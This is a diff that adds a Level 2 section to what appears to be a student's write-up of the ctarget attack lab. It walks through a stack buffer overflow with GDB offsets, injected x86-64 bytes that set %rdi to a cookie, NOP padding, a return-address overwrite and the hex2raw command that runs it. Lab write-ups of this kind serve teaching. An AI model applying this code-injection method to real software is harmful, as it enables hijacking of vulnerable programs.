@@ -87,6 +87,80 @@ PASS: Would have posted the following:
 
 ---
 
+## Level 2 (ctarget): Inject code to call touch2(cookie)
+
+### Goal
+Call `touch2` while passing the 64-bit-extended cookie value as the first argument in `%rdi`.
+
+### Why this differs from Level 1
+Level 1 only needed a direct jump to `touch1` by overwriting the saved return address. For `touch2`, we must set up the argument register `%rdi` first. We’ll inject a few bytes of code into the stack buffer that:
+
+1. Moves the cookie into `%rdi`.
+2. Executes `ret`, so control transfers to `touch2`, whose address we place on the stack right after our overwritten return address.
+
+### GDB recon (stack addresses)
+- At function entry (break on `getbuf`):
+  - `%rsp` = e.g., `0x5561dca0`
+  - `&buf`  = e.g., `0x5561dc78`
+- Distance: `0x5561dca0 - 0x5561dc78 = 0x28` (40 bytes)
+  - Bytes 0..39: fill the buffer
+  - Bytes 40..47: overwrite saved return address
+  - Bytes 48..55: next 8 bytes popped by our injected `ret`
+
+These values come from a live GDB run and show the classic 40-byte local array in `getbuf`.
+
+### Injected code (x86-64)
+- Set `%rdi` to cookie using `movabs` and then `ret`:
+  - `movabs $COOKIE, %rdi` → opcode bytes: `48 BF <imm64>` (10 bytes total)
+  - `ret` → `C3` (1 byte)
+
+### Payload layout (little-endian)
+1) Injected code in `buf`:
+   - `48 BF <cookie 8 bytes> C3`
+2) Padding with NOPs (`90`) to reach 40 bytes total so we land exactly at the saved return address overwrite.
+3) Overwrite saved return address with `&buf` (8 bytes) so that `ret` from `getbuf` jumps into our injected code.
+4) Next 8 bytes: address of `touch2` so our injected `ret` transfers to `touch2` with `%rdi` already set.
+
+Byte-count sanity check:
+- Code: 10 (movabs) + 1 (ret) = 11 bytes
+- Padding: 29 bytes of `90` → 11 + 29 = 40
+- Overwritten RA: 8 bytes (`&buf`)
+- `touch2` address: 8 bytes
+- Total payload length: 56 bytes
+
+### Building the payload
+Replace placeholders with your actual values:
+- Cookie (from `cookie.txt`), e.g., `0x59b997fa` → use 64-bit immediate `0x0000000059b997fa`
+- `&buf` (from GDB), e.g., `0x5561dc78` → bytes `78 DC 61 55 00 00 00 00`
+- `touch2` address (from `objdump -d ctarget`), e.g., `0x4019a9` → bytes `A9 19 40 00 00 00 00 00`
+
+Skeleton in hex (space-separated, for `hex2raw`):
+```
+48 BF FA 97 B9 59 00 00 00 00 C3
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90
+78 DC 61 55 00 00 00 00
+A9 19 40 00 00 00 00 00
+```
+
+Notes:
+- The first line encodes `movabs $0x0000000059b997fa, %rdi; ret` (example cookie shown). Substitute your cookie bytes.
+- The three lines of `90` are 29 total NOPs to reach 40 bytes before the return address overwrite.
+- The last two lines are `&buf` (overwrite RA) and `touch2` (target of the injected `ret`).
+
+### Execute
+```bash
+./hex2raw < ctarget.12.txt | ./ctarget -q
+```
+
+### Reflections / Tips
+- Docker on Apple Silicon can prevent GDB from accessing registers due to the emulation layer. A Linux VM with proper debugging support (e.g., GitHub Codespaces) works smoothly.
+- Always verify `&buf` and the exact `touch2` address in your current environment. ASLR is typically disabled for the lab binaries, but confirm within your session.
+- Counting bytes and maintaining little-endian order is critical for reliability.
+
+---
+
 ## Next Steps
 
 There are four more assignments focusing on:
